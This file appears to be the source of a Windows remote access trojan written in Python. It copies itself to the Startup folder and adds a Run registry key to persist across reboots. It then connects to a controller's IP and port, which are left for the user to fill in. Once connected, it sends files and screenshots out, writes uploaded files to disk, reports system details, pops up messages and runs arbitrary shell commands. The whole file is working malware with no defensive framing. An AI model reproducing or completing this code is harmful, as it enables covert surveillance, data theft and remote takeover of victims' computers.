import os
import socket
import subprocess
import platform
import pymsgbox
import pyautogui
import shutil
import winreg
from time import *
#never Don't edit 

try:
 source_file = "cccc.py"
 startup_folder = os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 destination_file = os.path.join(startup_folder, "cccc.py")
 shutil.copy(source_file, destination_file)
 key = winreg.HKEY_CURRENT_USER
 sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
 with winreg.OpenKey(key, sub_key, 0, winreg.KEY_WRITE) as registry_key:
    winreg.SetValueEx(registry_key, "MyStartupScript", 0, winreg.REG_SZ, destination_file)
except:
   print("i cant copy file to startup mr")

def connect_server(ip,port):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connected = False
    while not connected:
        try:
            s.connect((ip,port))
            print("Connected")
            connected = True
        except Exception as ex:
            print(ex)
            sleep(5)
    return s 


def reconnect(ip,port):
    while True:
        try:
            s = connect_server(ip,port)
            return s
        except:
            sleep(5)
            continue


def download_file(s,target):
    try:
        with open(target,"rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                s.send(chunk)
            sleep(0.1)
            s.send(b'Done')
    except FileNotFoundError:
        s.send("File Not Found!".encode('utf-8'))
    except Exception as ex:
        s.send(str(ex).encode('utf-8'))

def upload_file(s, target):
    try:
        with open(target, "wb") as f:
            while True:
                data = s.recv(4096)
                if data == b'Done':
                    break
                f.write(data)
    except Exception as ex:
        s.send(f"Error: {str(ex)}")

def screen(s):
    try:
        my_screenshot = pyautogui.screenshot()
        my_screenshot.save(r'PIC.png')
        with open("PIC.png", 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b""):
                s.send(chunk)
            sleep(0.1)  
            s.send(b"Done")
    except Exception as e:
        s.send(str(e).encode('utf-8'))

def change_cd(s,path):
    try:
        os.chdir(path)
        change = f" Change DIR to: {os.getcwd()}"
        s.send(change.encode('utf-8'))
    except FileNotFoundError:
        s.send("Directory Not Found!".encode('utf-8'))

def msg(s,massage):
    pymsgbox.alert(text = massage , title="New Massage!",button="OK")

def sysinfo(s):
    info = f'OS = {platform.uname()[0]} {platform.uname()[2]} {platform.uname()[3]} {platform.uname()[4]} {platform.uname()[5]} {platform.uname()[1]}'
    s.send(info.encode('utf-8'))

def cmd(s,command):
    try:
        res = subprocess.getoutput(command)
        s.send(res.encode('utf-8'))
    except Exception as ex:
        s.send(str(ex).encode('utf-8'))
#You can edit from here on
 